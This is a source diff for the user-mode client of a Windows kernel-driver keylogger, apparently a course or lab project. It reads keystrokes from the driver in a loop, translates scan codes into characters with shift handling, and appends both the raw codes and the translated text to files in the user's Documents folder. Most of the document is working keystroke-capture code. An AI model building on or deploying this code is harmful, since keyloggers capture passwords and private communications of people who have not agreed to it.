@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdbool.h>
+#include <shlobj.h>
 
 #include "../Shared.h"
 
@@ -76,9 +77,10 @@ void InitKeyTable() {
 
 bool isShifted;
 
-void ProcessScanCode(KEY_EVENT_DATA* keyData) {
+void ProcessScanCode(KEY_EVENT_DATA* keyData, FILE* file) {
     bool isBreak = (keyData->Flags & 1);
 
+    //We check if key event is from shift key
     if (keyData->MakeCode == 0x2A || keyData->MakeCode == 0x36) {
         isShifted = !isBreak;
         return;
@@ -90,18 +92,9 @@ void ProcessScanCode(KEY_EVENT_DATA* keyData) {
 
     char c = isShifted ? keyTable[keyData->MakeCode].shifted : keyTable[keyData->MakeCode].normal;
 
+    //If field for received code is not set in the keyTable we don't print it
     if (c != 0) {
-        FILE* file = fopen("C:\\Users\\WDKRemoteUser\\Desktop\\OS_keyloggerText.txt", "a");
-
-        if (file) {
-            fprintf(file, "%c", c);
-            fclose(file);
-        }
-        else
-        {
-            DWORD error = GetLastError();
-            printf("Could not open a file\n error: %lu\n", error);
-        }
+        fprintf(file, "%c", c);
     }
 }
 
@@ -110,6 +103,7 @@ int main() {
 	DWORD bytesReturned;
 	KEY_EVENT_DATA buffer;
 
+    //We create link to communicate with the driver
 	hDevice = CreateFile(L"\\\\.\\OS_keyloggerLink", GENERIC_READ , FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 
 	if (hDevice == INVALID_HANDLE_VALUE) {
@@ -121,18 +115,37 @@ int main() {
     InitKeyTable(keyTable);
 
 	BOOL status;
+
+    //We are trying to get user's Documents folder path
+    PWSTR documentsPath = NULL;
+    HRESULT result = SHGetKnownFolderPath(&FOLDERID_Documents, 0, NULL, &documentsPath);
+    
+    wchar_t codeFilePath[MAX_PATH];
+    wchar_t textFilePath[MAX_PATH];
+
+    if (SUCCEEDED(result)) {
+        swprintf(codeFilePath, MAX_PATH, L"%ls\\OS_keylogger_codes.txt", documentsPath);
+        swprintf(textFilePath, MAX_PATH, L"%ls\\OS_keylogger_text.txt", documentsPath);
+
+        CoTaskMemFree(documentsPath);
+    }
+    else {
+        printf("Could not get the docs path.\n");
+        return 2;
+    }
+
 	while (1) {
-		printf("request sent\n");
+        //Send request to drier waiting for key press
 		status = DeviceIoControl(hDevice, IOCTL_WAIT_FOR_KEY, NULL, 0, &buffer, sizeof(KEY_EVENT_DATA), &bytesReturned, NULL);
 		
 		if (status) {
 			printf("key recieved\n");
-			FILE* file = fopen("C:\\Users\\WDKRemoteUser\\Desktop\\OS_keylogger.txt", "a");
+            FILE* codeFile = _wfopen(codeFilePath, L"a");
+            FILE* textFile = _wfopen(textFilePath, L"a");
 
-			if (file) {
-				fprintf(file, "0x%hx 0x%hx\n", buffer.MakeCode, buffer.Flags);
-				fclose(file);
-				printf("saved key\n");
+			if (codeFile) {
+				fprintf(codeFile, "0x%hx 0x%hx\n", buffer.MakeCode, buffer.Flags);
+				fclose(codeFile);
 			}
 			else
 			{
@@ -140,7 +153,17 @@ int main() {
 				printf("Could not open a file\n error: %lu\n", error);
 			}
 
-            ProcessScanCode(&buffer);
+            if (textFile) {
+                ProcessScanCode(&buffer, textFile);
+                fclose(textFile);
+            }
+            else
+            {
+                DWORD error = GetLastError();
+                printf("Could not open a file\n error: %lu\n", error);
+            }
+
+            
 		}
 		else {
 			DWORD error = GetLastError();
